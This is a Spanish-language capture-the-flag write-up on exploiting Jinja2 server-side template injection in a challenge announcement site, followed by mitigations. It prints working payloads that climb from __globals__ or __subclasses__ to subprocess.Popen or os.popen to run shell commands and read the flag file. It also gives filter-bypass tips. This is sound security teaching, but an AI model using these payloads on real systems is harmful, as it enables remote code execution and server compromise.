#### Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.
## Solución (pasos esenciales)

### 1) Confirmar que hay SSTI

Prueba rápida para detectar evaluación de plantillas:

- Payload:
    
    `{{7*7}}`
    
    Si la página devuelve `49` → la entrada está siendo evaluada por el motor de plantillas (SSTI confirmado).
    

---

### 2) Probar accesos directos (si están permitidos)

En algunos retos `__self__`, `config`, `request` o `self` están disponibles; esto permite llegar a `__globals__` y `__builtins__` de forma directa. Ejemplos:

- Intentar leer globals:
    
    `{{ self.__init__.__globals__ }}`
    
- Intentar `__import__` desde builtins:
    
    `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}`
    

Si alguno de estos funciona, puedes llamar `os.popen('cat flag').read()` para obtener la flag.

> Si estos accesos están filtrados o no existen, pasar al paso 3 (bypass mediante introspección).

---

### 3) Bypass por introspección (técnica universal para Jinja2)

Cuando `__globals__` o `__builtins__` no están directamente accesibles, la técnica habitual es **usar la jerarquía de clases (MRO) e inspeccionar `__subclasses__()`** para localizar clases que permitan ejecutar procesos (por ejemplo `subprocess.Popen`) o acceder a módulos (`os`), y luego ejecutar comandos.

#### a) Enumerar subclases

Payload para volcar una lista de subclases (en páginas que permiten devolver listas largas):

`{{ ''.__class__.__mro__[2].__subclasses__() }}`

Eso imprime muchas entradas; busca manualmente la que parezca `subprocess.Popen` o alguna clase con `popen`/`Popen`.

#### b) Encontrar el índice del `subprocess.Popen` dinámicamente

Si la lista es grande, usa un payload para iterar y encontrar el índice (ejemplo conceptual — ajustar según la sandbox del reto):

`{% for i in range(0,200) %}   {% set c = ''.__class__.__mro__[2].__subclasses__()[i] %}   {{ i }} - {{ c }} {% endfor %}`

Esto imprime índices con nombres de clases; localiza el índice `N` de `subprocess.Popen`.

#### c) Ejecutar comando usando la subclase encontrada

Suponiendo que `subprocess.Popen` está en el índice `N`, ejecuta:

`{{ ''.__class__.__mro__[2].__subclasses__()[N]('cat flag', shell=True, stdout=-1).stdout.read() }}`

- `shell=True` permite ejecutar la cadena en shell.
    
- `stdout=-1` (o `subprocess.PIPE`) define que queremos capturar la salida.
    

**Nota:** a veces hay que adaptar el payload a la sintaxis del motor (por ejemplo convertir `-1` a `-1` está bien, pero algunos entornos requieren usar el entero explícito).

---

### 4) Variante si `subprocess` no aparece

Si `subprocess.Popen` no está disponible pero puedes acceder a módulos a través de `__import__` (mediante una clase encontrada), usa:

`{{ ''.__class__.__mro__[2].__subclasses__()[i].__init__.__globals__['__builtins__']['__import__']('os').popen('cat flag').read() }}`

O, si encuentras una función cuyo `__globals__` referencia `__builtins__`, extrae `__import__` desde allí y carga `os`.

---

### 5) Payloads alternativos útiles

- Lectura simple de archivos con `__import__`:
    
    `{{ __import__('os').popen('cat flag').read() }}`
    
    (funciona solo si `__import__` está accesible desde el contexto)
    
- Enumerar variables del contexto:
    
    `{{ config }} {{ request }} {{ g }}`
    
    (a veces `config` o `request` exponen módulos o funciones que facilitan la explotación)
    

---

## Ejemplo de flujo práctico (resumen)

1. Enviar `{{7*7}}` → confirmar `49`.
    
2. Probar `{{ self.__init__.__globals__ }}` → si funciona, hacer `__import__('os').popen('cat flag').read()`.
    
3. Si no, ejecutar `{{ ''.__class__.__mro__[2].__subclasses__() }}` → buscar `subprocess.Popen`.
    
4. Usar índice `N` en:
    
    `{{ ''.__class__.__mro__[2].__subclasses__()[N]('cat flag', shell=True, stdout=-1).stdout.read() }}`
    
5. Copiar la salida: esa es la flag.
    

---

## Notas adicionales / Precauciones

- **Sandboxing y filtros:** muchos retos aplican filtros que bloquean palabras clave (`__import__`, `popen`, `subprocess`, `os`, `eval`) o caracteres (`_`, `__`). En esos casos hay que ser creativo con técnicas de bypass (usar MRO/subclasses, concatenación de strings, atributos internamente divulgados).
    
- **Salida truncada:** la respuesta puede truncarse por el servidor; si la flag no se ve completa, intenta redirigir la salida a un archivo web‑accesible o usar `head`/`tail` para mostrar porciones.
    
- **Velocidad y detección:** no envíes payloads masivos repetidos muy rápido; algunos servidores aplican rate limiting o detección de abuso.
    
- **Ética y reglas del CTF:** no publiques la flag en foros hasta que esté permitido; comparte writeups con spoilers únicamente cuando corresponda.
    

---

## Mitigaciones (cómo arreglarlo en una aplicación real)

- **Nunca** renderizar entrada de usuario directamente como plantilla. Separar datos de templates.
    
- Habilitar **autoescape** y desactivar evaluación de expresiones arbitrarias.
    
- **No** exponer objetos del entorno (`self`, `config`, `request`) a las plantillas si no es necesario.
    
- Usar un motor de plantillas sin capacidad de ejecución (o con sandbox real) si se necesita contenido HTML generado a partir de entrada de usuario.
    
- Validar/limitar la longitud y el contenido de las entradas.
    
- Mantener el principio de mínimo privilegio en los procesos web (limitando lo que pueden ejecutar).
    

---

## Referencias y recursos útiles

- Documentación Jinja2 — conceptos de sandbox y seguridad.
    
- PortSwigger / OWASP — artículos sobre SSTI y ejemplos prácticos.
    
- Writeups de CTFs previos (SSTI) para payloads específicos y técnicas de bypass (usar `__class__.__mro__`, `__subclasses__()` y `__globals__`).